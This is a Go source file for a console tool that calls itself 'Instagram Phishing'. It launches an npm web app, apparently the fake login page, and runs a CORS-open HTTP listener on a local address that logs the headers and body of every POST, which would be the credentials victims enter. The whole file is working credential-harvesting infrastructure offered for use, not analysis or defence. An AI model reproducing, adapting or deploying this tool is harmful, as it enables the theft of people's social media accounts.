package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/rs/cors"
)

var (
	server    bool
	listening bool
	choice    string
	async     sync.WaitGroup
	control   = make(chan bool)
)

func startServer() error {
	os.Chdir("app")

	cmd := exec.Command("npm", "run", "start")
	if err := cmd.Start(); err != nil {
		log.Printf("\x1b[35m\x1b[1m\x1b[3mServer Start Error: %v\n\x1b[0m", err)
		return err
	}

	time.Sleep(time.Second * 3)
	log.Print("\x1b[35m\x1b[1m\x1b[3mServer Started!!\x1b[0m")
	server = true

	return nil
}

func stopServer() error {
	os.Chdir("app")

	cmd := exec.Command("npm", "run", "stop")
	if err := cmd.Start(); err != nil {
		log.Printf("\x1b[35m\x1b[1m\x1b[3mServer Stop Error: %v\n\x1b[0m", err)
		return err
	}

	time.Sleep(time.Second * 3)
	log.Print("\x1b[35m\x1b[1m\x1b[3mSession Ended\x1b[0m")
	server = false

	return nil
}

func startHTTPServer() error {
	mux := http.NewServeMux()

	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == http.MethodPost {
			log.Printf("\x1b[35m\x1b[1m\x1b[3mRequest: %s %s\n\x1b[0m", r.Method, r.URL.Path)
			log.Println("\x1b[35m\x1b[1m\x1b[3mHeader Information:\x1b[0m")
			for key, value := range r.Header {
				fmt.Printf("%s: %s\n", key, value)
			}

			body, err := ioutil.ReadAll(r.Body)
			if err != nil {
				http.Error(w, "Error", http.StatusInternalServerError)
				return
			}

			defer r.Body.Close()
			log.Println("Body Data:")
			log.Println(string(body))
		} else {
			http.Error(w, "Method Not Allowed", http.StatusMethodNotAllowed)
		}
	})

	async.Add(1)
	go func() {
		defer async.Done()
		c := cors.AllowAll()
		handler := c.Handler(mux)
		time.Sleep(time.Second * 3)
		log.Println("\x1b[35m\x1b[1m\x1b[3mServer Listening on 192.168.1.86:8080\x1b[0m")
		http.ListenAndServe("192.168.1.86:8080", handler)
		control <- true
	}()
	listening = true

	return nil
}

func main() {
	fmt.Println("\x1b[35m\x1b[1m\x1b[3mWelcome To Instagram Phishing (\x1b[4m'help'\x1b[24m: To See All Commands)\x1b[0m")
	for {
		fmt.Print("> ")
		fmt.Scan(&choice)

		choice = strings.ToLower(choice)

		switch choice {
		case "server.start":
			async.Add(1)
			go func() {
				defer async.Done()
				err := startServer()
				if err != nil {
					log.Print("\x1b[35m\x1b[1m\x1b[3mError:\x1b[0m", err)
					return
				}
				control <- true
			}()
		case "server.stop":
			async.Add(1)
			go func() {
				defer async.Done()
				err := stopServer()
				if err != nil {
					log.Print("\x1b[35m\x1b[1m\x1b[3mError:\x1b[0m", err)
					return
				}
				control <- true
			}()
		case "status":
			log.Printf("\x1b[35m\x1b[1m\x1b[3m[Server Status    : %v]\n\x1b[0m", server)
			log.Printf("\x1b[35m\x1b[1m\x1b[3m[Listening Status : %v]\n\x1b[0m", listening)
			continue

		case "exit":
			fmt.Println("\x1b[35m\x1b[1m\x1b[3mSee you later..\x1b[0m")
			return

		case "help":
			menu := "\x1b[35m\x1b[1m\x1b[3mCommands\n\n'server.start': Starting Web Server.\n'server.stop': Kill Web Server.\n'server.listen': Listening Web Server.\n'status': See Server Status.\n\x1b[0m"
			fmt.Println(menu)
			continue

		case "server.listen":
			if listening {
				log.Print("\x1b[35m\x1b[1m\x1b[3mServer Already Listening..\x1b[0m")

			} else {
				async.Add(1)
				go func() {
					defer async.Done()
					err := startHTTPServer()
					if err != nil {
						log.Print("\x1b[35m\x1b[1m\x1b[3mError:\x1b[0m", err)
						return
					}
					control <- true
				}()
				continue
			}
		default:
			continue
		}
		<-control
	}
}
